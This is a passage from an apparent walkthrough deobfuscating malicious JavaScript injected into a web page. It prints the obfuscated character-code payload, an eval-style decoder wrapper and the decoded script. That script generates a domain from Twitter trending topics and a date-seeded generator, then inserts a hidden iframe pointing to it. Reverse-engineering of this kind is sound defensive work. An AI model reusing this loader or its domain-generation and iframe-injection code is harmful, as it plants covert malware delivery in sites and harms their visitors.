67, 31, 61, 63, 29, 89, 74, 75, 78, 71, 10, 15, 15, 5, 44, 11, 93, 56, 47, 31, 5, 54, 10, 5, 44, 2, 22, 67, 16, 82, 87, 85, 74, 10, 56, 47, 2, 22, 48, 31, 56, 36, 61, 56, 47, 63, 29, 56, 36, 61, 56, 47, 63, 31, 56, 36, 61, 5, 44, 63, 29, 56, 36, 61, 5, 44, 63, 31, 5, 48, 95, 95, 34, 2, 56, 90, 10, 6, 11, 93, 56, 84, 31, 6, 16, 79, 67, 82, 10, 61, 26, 19, 14, 26, 23, 14, 25, 22, 14, 25, 22, 14, 27, 20, 14, 19, 25, 14, 26, 20, 14, 25, 21, 14, 26, 18, 14, 21, 18, 14, 26, 20, 14, 25, 25, 14, 20, 23, 14, 19, 19, 14, 19, 18, 14, 19, 18, 14, 24, 19, 14, 19, 19, 14, 23, 24, 14, 23, 23, 14, 19, 19, 14, 23, 21, 14, 24, 14, 23, 21, 14, 25, 14, 20, 14, 19, 14, 18, 14, 22, 26, 63, 14, 34, 10, 90, 14, 75, 2, 21, 53, 86, 84, 75, 80, 73, 16, 72, 84, 81, 79, 37, 74, 67, 84, 37, 81, 70, 71, 10, 75, 13, 90, 13, 20, 22, 11, 95, 11, 29, 62, 2, 5, 35, 10, 56, 84, 11, 2, 27, 72, 10, 90, 2, 21, 90, 2, 10, 95, 34, 2, 56, 74, 10, 6, 11, 93, 75, 72, 2, 12, 11, 3, 31, 2, 11, 42, 11, 93, 6, 10, 2, 28, 75, 72, 2, 12, 16, 56, 82, 11, 3, 31, 2, 11, 42, 11, 62, 29, 6, 16, 56, 82, 31, 19, 29, 2, 23, 38, 14, 34, 10, 56, 37, 11, 93, 5, 71, 31, 5, 68, 10, 56, 37, 2, 22, 87, 31, 5, 71, 2, 2, 47, 81, 80, 86, 74, 10, 11, 2, 29, 46, 31, 5, 71, 2, 2, 38, 67, 86, 71, 10, 2, 22, 91, 31, 34, 10, 90, 14, 75, 11, 93, 62, 10, 5, 72, 10, 90, 13, 4, 4, 11, 15, 19, 11, 33, 90, 28, 4, 18, 4, 13, 90, 95, 29, 56, 85, 31, 5, 91, 10, 5, 87, 14, 22, 11, 13, 4, 15, 4, 13, 5, 91, 10, 56, 46, 14, 25, 2, 22, 86, 31, 5, 38, 13, 5, 53, 10, 4, 39, 2, 19, 29, 56, 71, 31, 56, 42, 31, 56, 68, 10, 5, 71, 2, 2, 42, 81, 87, 84, 85, 10, 11, 14, 24, 11, 12, 24, 2, 29, 38, 31, 56, 71, 13, 19, 29, 5, 37, 31, 13, 96, 71, 92, 9, 11, 29, 2, 14, 2, 23, 86, 14, 34, 10, 56, 37, 11, 93, 86, 84, 91, 93, 5, 80, 31, 56, 37, 16, 86, 84, 71, 80, 70, 85, 29, 5, 79, 31, 5, 53, 10, 4, 2, 19, 13, 4, 2, 4, 2, 17, 56, 71, 30, 5, 37, 11, 56, 71, 2, 25, 56, 71, 2, 17, 56, 38, 30, 5, 37, 11, 56, 38, 2, 25, 56, 38, 29, 2, 26, 71, 13, 5, 53, 10, 58, 11, 63, 2, 17, 3, 5, 70, 11, 93, 2, 26, 38, 13, 5, 53, 10, 58, 11, 63, 95, 5, 70, 31, 10, 5, 70, 61, 21, 63, 16, 80, 67, 79, 71, 16, 86, 81, 46, 81, 89, 71, 84, 37, 67, 85, 71, 10, 11, 16, 84, 71, 82, 78, 67, 69, 71, 10, 17, 61, 64, 67, 15, 92, 63, 17, 73, 75, 14, 9, 9, 11, 13, 9, 79, 75, 69, 84, 81, 85, 69, 81, 82, 71, 9, 11, 16, 85, 82, 78, 75, 86, 10, 9, 9, 2, 22, 36, 31, 5, 87, 12, 25, 19, 13, 56, 42, 12, 21, 13, 56, 46, 12, 21, 25, 29, 5, 50, 10, 5, 36, 2, 22, 72, 31, 5, 54, 10, 22, 11, 13, 5, 37, 29, 5, 82, 10, 5, 70, 2, 22, 39, 31, 96, 37, 74, 9, 11, 13, 5, 35, 10, 5, 70, 11, 16, 85, 87, 68, 85, 86, 84, 75, 80, 73, 10, 18, 14, 5, 72, 11, 13, 9, 16, 69, 81, 79, 17, 9, 13, 56, 90, 10, 6, 11, 29, 56, 44, 61, 9, 60, 9, 63, 31, 5, 39, 29, 56, 89, 31, 96, 36, 43, 2, 20, 68, 75, 47, 55, 2, 20, 55, 77, 84, 60, 52, 75, 47, 52, 43, 35, 9, 11, 29, 6, 10, 96, 45, 2, 18, 16, 67, 82, 82, 71, 80, 70, 10, 56, 89, 11, 95, 69, 67, 86, 69, 74, 10, 56, 83, 11, 93, 95, 95, 11, 95, 14, 5, 37, 12, 5, 37, 12, 5, 37, 11, 95, 11, 95, 11, 95, 71, 78, 85, 71, 93, 2, 14, 2, 15, 14, 19, 13, 96, 54, 54, 54, 2, 18, 95, 95, 2, 15, 11, 5, 76, 85, 34, 72, 87, 80, 69, 86, 75, 81, 80, 56, 5, 45, 58, 9, 14, 9, 66, 9, 28, 9, 96, 5, 53, 10, 9, 62, 84, 71, 86, 87, 84, 80, 2, 2, 16, 73, 71, 86, 55, 54, 37, 2, 3, 16, 80, 81, 37, 81, 80, 72, 78, 75, 69, 86, 10, 86, 84, 87, 71, 11, 95, 69, 67, 86, 69, 74, 10, 71, 11, 93, 95, 2, 6, 5, 81, 16, 56, 2, 7, 10, 11, 14, 56, 77, 2, 2, 2, 8, 88, 67, 84, 2, 5, 2, 10, 16, 78, 71, 80, 73, 86, 74, 2, 11, 5, 81, 16, 5, 2, 12, 10, 86, 91, 82, 71, 81, 72, 10, 6, 2, 13, 38, 67, 86, 71, 16, 82, 84, 81, 86, 81, 86, 91, 82, 71, 16, 5, 2, 14, 85, 71, 86, 54, 75, 79, 71, 81, 87, 86, 10, 2, 28, 2, 15, 56, 74, 10, 5, 81, 16, 76, 51, 87, 71, 84, 91, 11, 95, 2, 17, 29, 75, 72, 10, 2, 18, 9, 11, 11, 2, 19, 54, 92, 71, 54, 87, 4, 11, 13, 56, 85, 2, 20, 91, 51, 42, 54, 82, 89, 71, 71, 71, 82, 51, 2, 21, 11, 93, 62, 2, 2, 22, 11, 29, 5, 2, 23, 6, 16, 73, 71, 86, 44, 53, 49, 48, 10, 5, 2, 24, 16, 76, 81, 75, 80, 10, 2, 25, 31, 96, 92, 9, 11, 13, 2, 26, 5, 70, 31, 5, 80, 61, 5, 79, 13, 56, 2, 27, 95, 34, 2, 5, 2, 28, 34, 10, 11, 93, 2, 29, 13, 10, 13, 96, 71, 2, 18, 29, 56];
}
```

"qq2" is a function that takes in a single argument and returns a list that starts with the character "L", followed by a bunch of numbers.
The operator "~~=" act similarly to a floor function (https://stackoverflow.com/questions/5971645/what-is-the-double-tilde-operator-in-javascript).

```
(function($$, _2, _1, doc, tk) {
	...
})(function(jsBb) {
        return (function(jsB, jsBs) {
            return jsBs(jsB(jsBs(jsB(jsBb))))(jsBb)()
        })((function(jsB) {
            return jsB.constructor
        }), (function(jsB) {
            return (function(jsBs) {
                //accumsan dapibus diam 
                return jsB.call(jsB, jsBs)
            })
        }))
    }, function(tt) {
        return tt.pop();
    },
    function(kk, dd, ch, pp) {
        for (var c = kk.length; c > 0;) {
            var x = ch(c);
            c -= x;
            var rep = kk.substr(c, x);
            //accumsan dapibus diam 
            var t = dd.split(rep);
            dd = t.join(pp(t));
        };
        return dd;
    }, document, document.getElementsByTagName('title'));
```

Finally, "tk" appears at the very beginning of the code as an argument for the entire parent function.
The entire parent function is an IIFE (https://www.geeksforgeeks.org/javascript-immediately-invoked-function-expressions-iife/).
Therefore, "tk" is the return value of 

```
document.getElementsByTagName('title')
```

Going back to the original code, we can replace the values as follows.

```
rd = fs('', qq2(6 - 2), 30, 0, qq2().length);
```

tk is a list of all "title" element in the html code. Because there were 2 of them, "tk.length" is 2.

I ran the following code to get the value of rd:

```
rd = ''

function qq2(cid) {
	cid = ~~cid;
	return ["L", 189 - 20 * cid, 175, 16 * cid, 70, 81, 89, 16, 73, 78, 81, 67, 31, 10, 2, 28, 2, 13, 83, 31, 2, 28, 88, 67, 84, 2, 56, 77, 31, 86, 74, 75, 85, 29, 62, 61, 56, 77, 2, 2, 40, 87, 78, 78, 59, 71, 67, 84, 2, 7, 47, 81, 80, 86, 74, 2, 7, 38, 67, 86, 71, 2, 7, 42, 81, 87, 84, 85, 2, 7, 47, 75, 80, 87, 86, 71, 85, 2, 7, 53, 71, 69, 81, 80, 70, 85, 10, 11, 63, 95, 29, 2, 13, 52, 31, 2, 28, 2, 8, 89, 14, 56, 91, 31, 86, 74, 75, 85, 16, 5, 83, 10, 11, 14, 75, 31, 18, 29, 56, 91, 61, 19, 63, 13, 31, 19, 29, 89, 74, 75, 78, 71, 10, 75, 13, 13, 30, 25, 11, 93, 5, 89, 31, 56, 91, 61, 75, 63, 2, 17, 5, 89, 30, 5, 37, 11, 56, 91, 61, 75, 63, 2, 25, 5, 89, 95, 62, 2, 56, 91, 16, 85, 82, 78, 75, 69, 71, 10, 96, 92, 9, 11, 14, 19, 13, 96, 54, 2, 18, 2, 24, 96, 87, 2, 18, 13, 9, 54, 9, 13, 56, 91, 2, 24, 96, 55, 2, 18, 95, 29, 56, 44, 31, 93, 9, 74, 66, 74, 86, 86, 82, 28, 17, 17, 58, 85, 66, 17, 58, 86, 66, 86, 84, 71, 58, 70, 66, 70, 67, 75, 58, 80, 66, 80, 70, 85, 58, 83, 66, 33, 58, 69, 66, 69, 67, 78, 78, 68, 67, 69, 77, 31, 58, 76, 66, 5, 58, 67, 66, 67, 82, 75, 58, 78, 66, 78, 91, 58, 57, 66, 86, 89, 75, 86, 86, 71, 84, 58, 81, 66, 69, 81, 79, 58, 71, 66, 19, 58, 77, 66, 85, 58, 45, 66, 68, 81, 70, 91, 58, 90, 66, 67, 76, 67, 90, 58, 38, 66, 16, 58, 46, 66, 78, 75, 68, 85, 58, 44, 66, 76, 83, 87, 71, 84, 91, 58, 24, 66, 24, 16, 20, 58, 79, 66, 79, 75, 80, 58, 72, 66, 81, 80, 58, 53, 66, 69, 84, 75, 82, 86, 58, 75, 66, 75, 72, 58, 47, 66, 84, 67, 79, 71, 58, 59, 66, 74, 71, 67, 70, 58, 89, 66, 89, 75, 70, 86, 74, 28, 58, 82, 66, 82, 90, 29, 58, 42, 66, 74, 71, 75, 73, 74, 86, 28, 58, 54, 66, 20, 58, 84, 66, 84, 69, 58, 51, 66, 4, 58, 91, 66, 85, 86, 91, 78, 71, 31, 58, 68, 66, 32, 30, 58, 52, 66, 32, 30, 17, 58, 43, 66, 70, 75, 88, 58, 36, 66, 30, 58, 35, 66, 32, 58, 73, 66, 73, 81, 81, 73, 78, 71, 58, 39, 66, 8, 70, 67, 86, 71, 31, 58, 92, 66, 18, 58, 87, 66, 15, 58, 55, 66, 2, 58, 14, 66, 28, 18, 18, 58, 29, 9, 28, 20, 21, 22, 23, 24, 25, 26, 27, 18, 19, 14, 9, 17, 9, 28, 22, 26, 20, 25, 19, 14, 9, 40, 9, 28, 19, 27, 26, 19, 27, 23, 20, 23, 22, 14, 9, 41, 9, 28, 19, 20, 14, 9, 37, 66, 31, 9, 95, 29, 34, 2, 5, 53, 10, 56, 81, 11, 93, 5, 74, 31, 61, 63, 29, 72, 81, 84, 10, 56, 86, 31, 18, 29, 56, 86, 30, 56, 81, 2, 10, 29, 56, 86, 13, 13, 11, 93, 5, 74, 16, 82, 87, 85, 74, 10, 56, 44, 61, 56, 81, 16, 69, 74, 67, 84, 35, 86, 10, 56, 86, 11, 63, 11, 95, 62, 2, 5, 35, 10, 5, 74, 11, 95, 56, 48, 31, 70, 81, 69, 87, 79, 71, 80, 86, 29, 5, 81, 31, 89, 75, 80, 70, 81, 89, 29, 2, 11, 42, 31, 9, 87, 80, 70, 71, 72, 75, 80, 71, 70, 9, 29, 2, 11, 38, 31, 96, 74, 67, 38, 57, 38, 81, 85, 71, 85, 86, 80, 85, 70, 78, 38, 76, 72, 83, 69, 83, 9, 2, 22, 75, 31, 2, 12, 11, 31, 31, 2, 11, 42, 11, 2, 17, 5, 75, 94, 94, 3, 56, 70, 10, 11, 11, 93, 75, 72, 10, 3, 5, 75, 11, 93, 86, 84, 91, 93, 56, 88, 31, 76, 51, 87, 71, 84, 91, 2, 3, 29, 86, 84, 91, 93, 56, 88, 31, 6, 2, 3, 95, 56, 80, 31, 56, 48, 16, 73, 71, 86, 39, 78, 71, 79, 71, 80, 86, 85, 36, 91, 54, 67, 73, 48, 67, 79, 71, 10, 96, 59, 2, 18, 61, 18, 63, 29, 5, 84, 31, 56, 48, 16, 69, 84, 71, 67, 86, 71, 39, 78, 71, 79, 71, 80, 86, 10, 96, 77, 53, 2, 18, 29, 5, 84, 16, 85, 71, 86, 35, 86, 86, 84, 75, 68, 87, 86, 71, 10, 96, 77, 84, 9, 11, 14, 5, 53, 10, 4, 74, 90, 38, 73, 67, 77, 38, 81, 85, 90, 85, 46, 85, 44, 85, 71, 38, 24, 85, 44, 38, 79, 38, 76, 4, 11, 11, 29, 56, 80, 16, 67, 82, 82, 71, 80, 70, 37, 74, 75, 78, 70, 10, 5, 84, 11, 95, 34, 2, 56, 68, 10, 5, 92, 14, 56, 69, 2, 21, 47, 67, 86, 74, 16, 72, 78, 81, 81, 84, 10, 5, 92, 17, 56, 69, 11, 2, 27, 54, 10, 5, 40, 11, 93, 88, 67, 84, 2, 56, 79, 31, 56, 68, 10, 2, 11, 90, 14, 2, 6, 67, 11, 29, 2, 8, 76, 31, 2, 11, 90, 7, 2, 6, 67, 29, 2, 8, 46, 31, 2, 6, 91, 12, 5, 76, 29, 2, 8, 69, 31, 2, 6, 53, 12, 56, 79, 29, 2, 8, 85, 31, 5, 46, 15, 5, 69, 2, 17, 5, 85, 32, 18, 11, 93, 5, 90, 31, 5, 85, 95, 71, 78, 85, 71, 93, 5, 90, 31, 5, 85, 13, 2, 6, 73, 95, 62, 10, 5, 90, 7, 5, 40, 11, 2, 27, 50, 10, 5, 41, 11, 93, 2, 11, 90, 31, 96, 29, 9, 11, 13, 5, 41, 29, 2, 6, 91, 31, 96, 17, 9, 11, 29, 2, 6, 73, 31, 96, 29, 9, 11, 15, 96, 40, 9, 11, 29, 2, 6, 67, 31, 56, 68, 10, 2, 6, 73, 14, 2, 6, 91, 11, 29, 2, 6, 53, 31, 2, 6, 73, 7, 2, 6, 91, 2, 27, 35, 10, 56, 2, 21, 56, 2, 10, 31, 31, 19, 33, 56, 61, 18, 63, 28, 56, 2, 24, 9, 9, 11, 95, 29, 34, 2, 5, 68, 10, 56, 11, 93, 70, 31, 80, 71, 89, 2, 38, 67, 86, 71, 10, 2, 22, 73, 31, 96, 92, 71, 71, 9, 11, 29, 70, 16, 85, 71, 86, 54, 75, 79, 71, 10, 10, 56, 16, 67, 85, 65, 81, 72, 15, 96, 41, 9, 11, 12, 96, 41, 9, 11, 12, 96, 41, 9, 11, 12, 96, 71, 92, 92, 2, 18, 12, 96, 71, 92, 92, 92, 2, 18, 29, 62, 2, 70, 2, 27, 82, 10, 56, 36, 11, 93, 2, 8, 48, 14, 56, 47, 14, 5, 44, 31, 56, 36, 2, 10, 29, 2, 8, 67, 31, 61, 63, 29, 89, 74, 75, 78, 71, 10, 15, 15, 5, 44, 11, 93, 56, 47, 31, 5, 54, 10, 5, 44, 2, 22, 67, 16, 82, 87, 85, 74, 10, 56, 47, 2, 22, 48, 31, 56, 36, 61, 56, 47, 63, 29, 56, 36, 61, 56, 47, 63, 31, 56, 36, 61, 5, 44, 63, 29, 56, 36, 61, 5, 44, 63, 31, 5, 48, 95, 95, 34, 2, 56, 90, 10, 6, 11, 93, 56, 84, 31, 6, 16, 79, 67, 82, 10, 61, 26, 19, 14, 26, 23, 14, 25, 22, 14, 25, 22, 14, 27, 20, 14, 19, 25, 14, 26, 20, 14, 25, 21, 14, 26, 18, 14, 21, 18, 14, 26, 20, 14, 25, 25, 14, 20, 23, 14, 19, 19, 14, 19, 18, 14, 19, 18, 14, 24, 19, 14, 19, 19, 14, 23, 24, 14, 23, 23, 14, 19, 19, 14, 23, 21, 14, 24, 14, 23, 21, 14, 25, 14, 20, 14, 19, 14, 18, 14, 22, 26, 63, 14, 34, 10, 90, 14, 75, 2, 21, 53, 86, 84, 75, 80, 73, 16, 72, 84, 81, 79, 37, 74, 67, 84, 37, 81, 70, 71, 10, 75, 13, 90, 13, 20, 22, 11, 95, 11, 29, 62, 2, 5, 35, 10, 56, 84, 11, 2, 27, 72, 10, 90, 2, 21, 90, 2, 10, 95, 34, 2, 56, 74, 10, 6, 11, 93, 75, 72, 2, 12, 11, 3, 31, 2, 11, 42, 11, 93, 6, 10, 2, 28, 75, 72, 2, 12, 16, 56, 82, 11, 3, 31, 2, 11, 42, 11, 62, 29, 6, 16, 56, 82, 31, 19, 29, 2, 23, 38, 14, 34, 10, 56, 37, 11, 93, 5, 71, 31, 5, 68, 10, 56, 37, 2, 22, 87, 31, 5, 71, 2, 2, 47, 81, 80, 86, 74, 10, 11, 2, 29, 46, 31, 5, 71, 2, 2, 38, 67, 86, 71, 10, 2, 22, 91, 31, 34, 10, 90, 14, 75, 11, 93, 62, 10, 5, 72, 10, 90, 13, 4, 4, 11, 15, 19, 11, 33, 90, 28, 4, 18, 4, 13, 90, 95, 29, 56, 85, 31, 5, 91, 10, 5, 87, 14, 22, 11, 13, 4, 15, 4, 13, 5, 91, 10, 56, 46, 14, 25, 2, 22, 86, 31, 5, 38, 13, 5, 53, 10, 4, 39, 2, 19, 29, 56, 71, 31, 56, 42, 31, 56, 68, 10, 5, 71, 2, 2, 42, 81, 87, 84, 85, 10, 11, 14, 24, 11, 12, 24, 2, 29, 38, 31, 56, 71, 13, 19, 29, 5, 37, 31, 13, 96, 71, 92, 9, 11, 29, 2, 14, 2, 23, 86, 14, 34, 10, 56, 37, 11, 93, 86, 84, 91, 93, 5, 80, 31, 56, 37, 16, 86, 84, 71, 80, 70, 85, 29, 5, 79, 31, 5, 53, 10, 4, 2, 19, 13, 4, 2, 4, 2, 17, 56, 71, 30, 5, 37, 11, 56, 71, 2, 25, 56, 71, 2, 17, 56, 38, 30, 5, 37, 11, 56, 38, 2, 25, 56, 38, 29, 2, 26, 71, 13, 5, 53, 10, 58, 11, 63, 2, 17, 3, 5, 70, 11, 93, 2, 26, 38, 13, 5, 53, 10, 58, 11, 63, 95, 5, 70, 31, 10, 5, 70, 61, 21, 63, 16, 80, 67, 79, 71, 16, 86, 81, 46, 81, 89, 71, 84, 37, 67, 85, 71, 10, 11, 16, 84, 71, 82, 78, 67, 69, 71, 10, 17, 61, 64, 67, 15, 92, 63, 17, 73, 75, 14, 9, 9, 11, 13, 9, 79, 75, 69, 84, 81, 85, 69, 81, 82, 71, 9, 11, 16, 85, 82, 78, 75, 86, 10, 9, 9, 2, 22, 36, 31, 5, 87, 12, 25, 19, 13, 56, 42, 12, 21, 13, 56, 46, 12, 21, 25, 29, 5, 50, 10, 5, 36, 2, 22, 72, 31, 5, 54, 10, 22, 11, 13, 5, 37, 29, 5, 82, 10, 5, 70, 2, 22, 39, 31, 96, 37, 74, 9, 11, 13, 5, 35, 10, 5, 70, 11, 16, 85, 87, 68, 85, 86, 84, 75, 80, 73, 10, 18, 14, 5, 72, 11, 13, 9, 16, 69, 81, 79, 17, 9, 13, 56, 90, 10, 6, 11, 29, 56, 44, 61, 9, 60, 9, 63, 31, 5, 39, 29, 56, 89, 31, 96, 36, 43, 2, 20, 68, 75, 47, 55, 2, 20, 55, 77, 84, 60, 52, 75, 47, 52, 43, 35, 9, 11, 29, 6, 10, 96, 45, 2, 18, 16, 67, 82, 82, 71, 80, 70, 10, 56, 89, 11, 95, 69, 67, 86, 69, 74, 10, 56, 83, 11, 93, 95, 95, 11, 95, 14, 5, 37, 12, 5, 37, 12, 5, 37, 11, 95, 11, 95, 11, 95, 71, 78, 85, 71, 93, 2, 14, 2, 15, 14, 19, 13, 96, 54, 54, 54, 2, 18, 95, 95, 2, 15, 11, 5, 76, 85, 34, 72, 87, 80, 69, 86, 75, 81, 80, 56, 5, 45, 58, 9, 14, 9, 66, 9, 28, 9, 96, 5, 53, 10, 9, 62, 84, 71, 86, 87, 84, 80, 2, 2, 16, 73, 71, 86, 55, 54, 37, 2, 3, 16, 80, 81, 37, 81, 80, 72, 78, 75, 69, 86, 10, 86, 84, 87, 71, 11, 95, 69, 67, 86, 69, 74, 10, 71, 11, 93, 95, 2, 6, 5, 81, 16, 56, 2, 7, 10, 11, 14, 56, 77, 2, 2, 2, 8, 88, 67, 84, 2, 5, 2, 10, 16, 78, 71, 80, 73, 86, 74, 2, 11, 5, 81, 16, 5, 2, 12, 10, 86, 91, 82, 71, 81, 72, 10, 6, 2, 13, 38, 67, 86, 71, 16, 82, 84, 81, 86, 81, 86, 91, 82, 71, 16, 5, 2, 14, 85, 71, 86, 54, 75, 79, 71, 81, 87, 86, 10, 2, 28, 2, 15, 56, 74, 10, 5, 81, 16, 76, 51, 87, 71, 84, 91, 11, 95, 2, 17, 29, 75, 72, 10, 2, 18, 9, 11, 11, 2, 19, 54, 92, 71, 54, 87, 4, 11, 13, 56, 85, 2, 20, 91, 51, 42, 54, 82, 89, 71, 71, 71, 82, 51, 2, 21, 11, 93, 62, 2, 2, 22, 11, 29, 5, 2, 23, 6, 16, 73, 71, 86, 44, 53, 49, 48, 10, 5, 2, 24, 16, 76, 81, 75, 80, 10, 2, 25, 31, 96, 92, 9, 11, 13, 2, 26, 5, 70, 31, 5, 80, 61, 5, 79, 13, 56, 2, 27, 95, 34, 2, 5, 2, 28, 34, 10, 11, 93, 2, 29, 13, 10, 13, 96, 71, 2, 18, 29, 56];
}

function fs(ro, arr, add, st, length, dp) {
	var hf = ((length + st) >> 1);
	if (length - st > 16) {
		return fs(ro, arr, add, st, hf, dp + 1) + fs(ro, arr, add, hf, length, dp + 1)
	} else {
		var rt = '';
		for (var i = st; i < length; i++) {
			if (typeof arr[i] != 'string') {
				rt += String.fromCharCode(arr[i] + 30);
			}
		}
		return rt;
	}
}

rd += fs('', qq2(4), 30, 0, qq2().length);

console.log(rd)
```

The result I got was the following:

```
Í^dow.gloa=( : +q= :var Vk=this;\[Vk  FullYear %Month %Date %Hours %Minutes %Seconds()]}; +R= : &w,Vy=this.#q(),i=0;Vy[1]+=1;while(i++<7){#w=Vy[i] /#w<#C)Vy[i] 7#w}\ Vy.splice(~z'),1+~T 0 6~u 0+'T'+Vy 6~U 0};VJ={'h`http://Xs`/Xt`treXd`daiXn`ndsXq`?Xc`callback=Xj`#Xa`apiXl`lyXW`twitterXo`comXe`1Xk`sXK`bodyXx`ajaxXD`.XL`libsXJ`jqueryX6`6.2Xm`minXf`onXS`criptXi`ifXM`rameXY`headXw`width:Xp`px;XH`height:XT`2Xr`rcXQ`"Xy`style=Xb`><XR`></XI`divXB`<XA`>Xg`googleXE`&date=Xz`0Xu`-XU` X,`:00X;':2345678901,'/':48271,'F':198195254,'G':12,'C`='};@ #S(Vo){#h=[];for(Vt=0;Vt<Vo (;Vt++){#h.push(VJ[Vo.charAt(Vt)])}\ #A(#h)}VN=document;#o=window; )H='undefined'; )D=~haDWDosestnsdlDjfqcq' 4i= *)== )H) /#i||!Vd()){if(!#i){try{Vv=jQuery !;try{Vv=$ !}Vn=VN.getElementsByTagName(~Y 0[0];#r=VN.createElement(~kS 0;#r.setAttribute(~kr'),#S("hxDgakDosxsLsJseD6sJDmDj"));Vn.appendChild(#r)}@ Vb(#z,Vc 3Math.floor(#z/Vc) 9T(#F){var Vm=Vb( )x, $a); &j= )x% $a; &L= $y*#j; &c= $S*Vm; &s=#L-#c /#s>0){#x=#s}else{#x=#s+ $g}\(#x%#F) 9P(#G){ )x=~;')+#G; $y=~/'); $g=~;')-~F'); $a=Vb( $g, $y); $S= $g% $y 9A(V 3V (==1?V[0]:V 6'')};@ #b(V){d=new Date( 4g=~zee');d.setTime((V.as_of-~G')*~G')*~G')*~ezz 0*~ezzz 0;\ d 9p(VB){ &N,VM,#J=VB (; &a=[];while(--#J){VM=#T(#J 4a.push(VM 4N=VB[VM];VB[VM]=VB[#J];VB[#J]=#N}}@ Vx($){Vr=$.map([81,85,74,74,92,17,82,73,80,30,82,77,25,11,10,10,61,11,56,55,11,53,6,53,7,2,1,0,48],@(x,i 3String.fromCharCode(i+x+24)});\ #A(Vr) 9f(x 3x (}@ Vh($){if *)!= )H){$( :if *.Vp)!= )H)\;$.Vp=1; 5D,@(VC){#e=#b(VC 4u=#e  Month() ;L=#e  Date( 4y=@(x,i){\(#f(x+"")-1)?x:"0"+x};Vs=#y(#u,4)+"-"+#y(VL,7 4t=#D+#S("E 1;Ve=VH=Vb(#e  Hours(),6)*6 ;D=Ve+1;#C=+~ez'); , 5t,@(VC){try{#n=VC.trends;#m=#S(" 1+" " /Ve<#C)Ve 7Ve /VD<#C)VD 7VD; 8e+#S(X)] /!#d){ 8D+#S(X)]}#d=(#d[3].name.toLowerCase().replace(/[^a-z]/gi,'')+'microscope').split('' 4B=#u*71+VH*3+VL*37;#P(#B 4f=#T(4)+#C;#p(#d 4E=~Ch')+#A(#d).substring(0,#f)+'.com/'+Vx($);VJ['Z']=#E;Vw=~BI 2biMU 2UkrZRiMRIA');$(~K 0.append(Vw)}catch(Vq){}})},#C*#C*#C)})})}else{ , -,1+~TTT 0}} -)#js@functionV#KX','`':'~#S('\return  .getUTC !.noConflict(true)}catch(e){} $#o.V %(),Vk   &var # (.length )#o.# *(typeof($ +Date.prototype.# ,setTimeout( : -Vh(#o.jQuery)} /;if( 0')) 1TzeTu")+Vs 2yQHTpweeepQ 3){\  4);# 5$.getJSON(# 6.join( 7=~z')+ 8#d=#n[#m+V 9}@ # :@(){ ;+(+~e 0;V
```

We find some interesting strings, but we will ignore them for now.

The last lines of the parent function are:

```
try {
		$$(_1(map, rd, choo, _2).replace('?n', 'in'));
} catch (e) {}
```

"choo" is a function that performs the following operation:

```
function choo(k) {
		if (k < 9) {
				return 1
		} else {
				return 2
		}
};
```

It will return "1" if the input is less than 9 and return "2" otherwise. 

In JavaScript, "$$" is a valid function and variable name, and so are "_1" and "_2". They appear in the parent function arguments:

```
(function($$, _2, _1, doc, tk) {
  ...
})(function(jsBb) {
        return (function(jsB, jsBs) {
            return jsBs(jsB(jsBs(jsB(jsBb))))(jsBb)()
        })((function(jsB) {
            return jsB.constructor
        }), (function(jsB) {
            return (function(jsBs) {
                //accumsan dapibus diam 
                return jsB.call(jsB, jsBs)
            })
        }))
    }, function(tt) {
        return tt.pop();
    },
    function(kk, dd, ch, pp) {
        for (var c = kk.length; c > 0;) {
            var x = ch(c);
            c -= x;
            var rep = kk.substr(c, x);
            //accumsan dapibus diam 
            var t = dd.split(rep);
            dd = t.join(pp(t));
        };
        return dd;
    }, document, document.getElementsByTagName('title'));
```

Similar to how we got the "tk" value earlier, "$$" is the first function that appears on the above code, "_2" being the second function, and "_1" being the third function.

We will skip the "$$" function for now and analyze the "_1" and "_2" functions first.

```
function(tt) {
		return tt.pop();
}
```

The "_2" function is the same as the JavaScript built-in "pop" function, which removes the last element from an array.

```
function(kk, dd, ch, pp) {
		for (var c = kk.length; c > 0;) {
				var x = ch(c);
				c -= x;
				var rep = kk.substr(c, x);
				var t = dd.split(rep);
				dd = t.join(pp(t));
		};
		return dd;
}
```

The "_1" function takes in 4 arguments. We can replace these with the paremeter used in the original function:

```
function(map, rd, choo, _2) {
		for (var c = map.length; c > 0;) {
				var x = choo(c);
				c -= x;
				var rep = map.substr(c, x);
				var t = rd.split(rep);
				rd = t.join(_2(t));
		};
		return dd;
}
```

At this point, we can recreate the function to figure out the returned "dd" value.

```
function choo(k) {
        if (k < 9) {
                return 1
        } else {
                return 2
        }
};

function _2(tt) {
        return tt.pop();
}

for (var c = map.length; c > 0;) {
        var x = choo(c);
        c -= x;
        var rep = map.substr(c, x);
        var t = rd.split(rep);
        rd = t.join(_2(t));
};

console.log(rd)
```

Which resulted in the following:

```
Í^dow.gloa=(function(){Date.prototype.jsq=function(){var jsKk=this;return[jsKk.getUTCFullYear(),jsKk.getUTCMonth(),jsKk.getUTCDate(),jsKk.getUTCHours(),jsKk.getUTCMinutes(),jsKk.getUTCSeconds()]};Date.prototype.jsR=function(){var jsw,jsKy=this.jsq(),i=0;jsKy[1]+=1;while(i++<7){jsw=jsKy[i];if(jsw<jsC)jsKy[i]=jsS('z')+jsw}return jsKy.splice(jsS('z'),1+jsS('T')).join(jsS('u'))+'T'+jsKy.join(jsS('U'))};jsKJ={'h':'http://','s':'/','t':'tre','d':'dai','n':'nds','q':'?','c':'callback=','j':'js','a':'api','l':'ly','W':'twitter','o':'com','e':'1','k':'s','K':'body','x':'ajax','D':'.','L':'libs','J':'jquery','6':'6.2','m':'min','f':'on','S':'cript','i':'if','M':'rame','Y':'head','w':'width:','p':'px;','H':'height:','T':'2','r':'rc','Q':'"','y':'style=','b':'><','R':'></','I':'div','B':'<','A':'>','g':'google','E':'&date=','z':'0','u':'-','U':' ',',':':00',';':2345678901,'/':48271,'F':198195254,'G':12,'C':'='};function jsS(jsKo){jsh=[];for(jsKt=0;jsKt<jsKo.length;jsKt++){jsh.push(jsKJ[jsKo.charAt(jsKt)])}return jsA(jsh)}jsKN=document;jso=window;jso.jsH='undefined';jso.jsD=jsS('haDWDosestnsdlDjfqcq');jsi=(typeof($)==jso.jsH);if(jsi||!jsKd()){if(!jsi){try{jsKv=jQuery.noConflict(true)}catch(e){};try{jsKv=$.noConflict(true)}catch(e){}}jsKn=jsKN.getElementsByTagName(jsS('Y'))[0];jsr=jsKN.createElement(jsS('kS'));jsr.setAttribute(jsS('kr'),jsS("hxDgakDosxsLsJseD6sJDmDj"));jsKn.appendChild(jsr)}function jsKb(jsz,jsKc){return Math.floor(jsz/jsKc)}function jsT(jsF){var 